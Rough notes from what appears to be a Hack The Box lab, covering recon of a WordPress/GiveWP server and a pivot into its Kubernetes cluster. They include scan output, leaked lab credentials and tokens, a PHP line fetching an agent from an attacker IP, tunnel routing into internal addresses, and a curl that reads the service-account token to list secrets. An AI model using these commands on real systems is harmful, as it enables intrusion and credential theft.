---
tags:
  - Linux
  - HTB
---

We will start with nmap:
```sh
sudo nmap -sV -sC -Pn -vv 10.129.131.40 -T4

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNmct03SP9FFs6NQ+Pih2m65SYS/Kte9aGv3C8l43TJGj2UcSrcheEX2jBL/jbje/HRafbJcGqz1bKeQo1cbAc=
|   256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjor5/gXrTqGEWiETEzhgoni1P2kXV3B4O2/v2SGnH0
80/tcp open  http    syn-ack ttl 62 nginx 1.28.0
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
| http-methods:
|_  Supported Methods: GET HEAD POST
```

```sh
[+] URL: http://10.129.131.40/ [10.129.131.40]
[+] Started: Wed Nov  5 17:37:24 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.129.131.40/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.129.131.40/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://10.129.131.40/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://10.129.131.40/wp-content/themes/bizberg/readme.txt
 | Style URL: http://10.129.131.40/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.131.40/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] give
 | Location: http://10.129.131.40/wp-content/plugins/give/
 | Last Updated: 2025-10-29T20:17:00.000Z
 | [!] The version is out of date, the latest version is 4.12.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 19 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 |
 | [!] Title: GiveWP < 3.16.0 - Unauthenticated Full Path Disclosure
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/6ff11e50-188e-4191-be12-ab4bde9b6d27
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6551
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2a13ce09-b312-4186-b0e2-63065c47f15d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Authenticated (GiveWP Manager+) SQL Injection via order Parameter
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/aed98bed-b6ed-4282-a20e-995515fd43a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9130
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a3cae01-620d-405e-baf6-2d66a5b429b3
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1807282-5f15-4b21-81b6-dcb8b03618bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8353
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4c530fa-eaf4-4721-bfb6-9fc06d7f343c
 |
 | [!] Title: GiveWP < 3.16.0 - Cross-Site Request Forgery
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/582c6a46-486e-41ca-9c45-96dfe8b8ddbb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47315
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ce9bac7-60bb-4880-9e37-4d71f02ee941
 |
 | [!] Title: GiveWP < 3.16.4 - Unauthenticated PHP Object Injection to Remote Code Execution
 |     Fixed in: 3.16.4
 |     References:
 |      - https://wpscan.com/vulnerability/793bdc97-69eb-43c3-aab0-c86a76285f36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9634
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8eb3aa9-fe60-48b6-aa24-7873dd68b47e
 |
 | [!] Title: Give < 3.19.0 - Reflected XSS
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f196294-5ba9-45b6-a27c-ab1702cc001f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11921
 |
 | [!] Title: GiveWP < 3.19.3 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.3
 |     References:
 |      - https://wpscan.com/vulnerability/571542c5-9f62-4e38-baee-6bbe02eec4af
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12877
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b2143edf-5423-4e79-8638-a5b98490d292
 |
 | [!] Title: GiveWP < 3.19.4 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.4
 |     References:
 |      - https://wpscan.com/vulnerability/82afc2f7-948b-495e-8ec2-4cd7bbfe1c61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/06a7ff0b-ec6b-490c-9bb0-fbb5c1c337c4
 |
 | [!] Title: GiveWP < 3.20.0 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/e27044bd-daab-47e6-b399-de94c45885c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0912
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a8ae1b0-e9a0-4179-970b-dbcb0642547c
 |
 | [!] Title: Give < 3.22.1 - Missing Authorization to Unauthenticated Arbitrary Earning Reports Disclosure via give_reports_earnings Function
 |     Fixed in: 3.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebe88626-2127-4021-aa8e-f2f47e12ad4f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2025
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40595943-121d-4492-a0ed-f2de1bd99fda
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.22.2 - Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/b331a81b-b7cc-4e0a-a088-26468a835cc5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2331
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b4d9acfb-bb9d-4b00-b439-c7ccea751f8d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.3.1 - Missing Authorization To Authenticated (Contributor+) Campaign Data View And Modification
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/f819ea85-bf28-4e8c-b72b-59741e7e9cee
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4571
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f03b4ef-e877-430e-a440-3af0feca818c
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.0 - Authenticated (GiveWP worker+) Stored Cross-Site Scripting
 |     Fixed in: 4.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fda8eaea-ca20-417a-896b-49c1fa0a1c07
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7205
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/39e501d8-88a0-4625-aeb0-aa33fc89a8d4
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.1 - Unauthenticated Donor Data Exposure
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/4739fdb8-9444-44b9-8e98-7a299e6fe186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8620
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6dc7c5a6-513e-4aa8-9538-0ac6fb37c867
 |
 | [!] Title: GiveWP < 4.6.1 - Missing Authorization to Donation Update
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/bdfb968d-df2b-43ed-9a9c-f9b15d8457f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7221
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8766608e-df72-4b9d-a301-a50c64fadc9a
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.10.1 - Missing Authorization to Unauthenticated Forms-Campaign Association
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/5dccab73-e06f-4c01-837b-eddf42ea789d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11228
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ddf9a043-5eb6-46fd-88c2-0f5a04f73fc9
 |
 | [!] Title: GiveWP < 4.10.1 - Unauthenticated Forms and Campaigns Disclosure
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/e7a291a5-3846-42e7-b4f2-7b2383326d4c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11227
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/54db1807-69ff-445c-9e02-9abce9fd3940
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://10.129.131.40/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://10.129.131.40/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://10.129.131.40/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:30 <===================================================================================================================> (652 / 652) 100.00% Time: 00:01:30
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:08:44 <===============> (2575 / 2575) 100.00% Time: 00:08:44=======================================================      > (2449 / 2575) 95.10%  ETA: 00:00:2[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:27 <====================================================================================================================> (137 / 137) 100.00% Time: 00:00:27

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:15 <==========================================================================================================================> (75 / 75) 100.00% Time: 00:00:15

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:19 <===============================================================================================================> (100 / 100) 100.00% Time: 00:00:19

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=====================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] user
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.129.131.40/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://10.129.131.40/wp-json/oembed/1.0/embed?url=http://10.129.131.40/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://10.129.131.40/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Wed Nov  5 17:48:50 2025
[+] Requests Done: 3572
[+] Cached Requests: 46
[+] Data Sent: 995.896 KB
[+] Data Received: 1.261 MB
[+] Memory used: 332.117 MB
[+] Elapsed time: 00:11:26

```


bn_wordpress : sW5sp4spa3u7RLyetrekE4oS  beta-vino-wp-mariadb:3306
```
$wp$2y$10$LHr4t84dW9dI3JpuBwAXHO9/ikQa9GmLAPenyfn.Eq1rBW0h.43sK
```

```sh
KUBERNETES_PORT=tcp://10.43.0.1:443
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204:443/80
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82:3306
```


```sh
php -r "file_put_contents('agent', file_get_contents('http://10.10.17.65/agent'));"
sudo ip tuntap add user slom mode tun evil
sudo ip link set evil up                    
sudo ip route add 10.43.61.204/32 dev evil
sudo ip route add 10.43.147.82/32 dev evil
sudo ip route add 10.43.2.241/32 dev evil
```

```
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA

```

```
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0MDYwNjIxLCJpYXQiOjE3NjI1MjQ2MjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNTBlMGVjYWItYjUzOS00ZWZiLThkM2UtYjQ0Yjk4MjYxNTMyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWI0ejhkIiwidWlkIjoiMDFlODRkZDMtY2ZiYS00ZTdkLThjZTEtYmFkMDM1ODE0ZjgzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjUyODIyOH0sIm5iZiI6MTc2MjUyNDYyMSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.q55LxBnWERgh2JTIiYKOK3ts2laTnDBT5OwO_SSoK9tbp1v3YRlEj_5wl3g_WahH7Oku3a-o68iTuHaxMZnIlVM9SUTpDxH6HcyEadnUeekp2-11TIGgqMgvqzWfhq9x6JEsGCN8ZASq0MIhGdkhSu2r9pl8N3iqTfXB6bqODUWKlgByocWhGEQeV_lBOublMvV9bCfedmrNH6n6I_7z7YbRzCiulI-1HbyFeR3vQ9Fk8zzILmeEBEhWXd_WUkxgYLupD8Yy_gEygmcTKJayTIgox-umt8wXeOpQukJde9x8ffjeCFRn9lLj2yDXiWt36W4zCJZlbjybRTqHhGXmlQ
```

```
sW5sp4syetre32828383kE4oS 
sW5sp4syetre32828383kE4oS
sW5sp4spa3u7RLyetrekE4oS 
O8F7KR5zGi

RGZQNTBQZXhjQkpjcXEzZ29Hc1hCall0MlVlSzhLeDU=
dUlBQ0p1SFU4QkFDc3pqcXhhRWlxM21zSkhkUDJ1UlY=
TzhGN0tSNXpHaQ==


"mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
"mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="


```

```
curl -s --cacert "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"



nABm0hmLHnTc8Z0cJzsNa7rC19hO9e
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```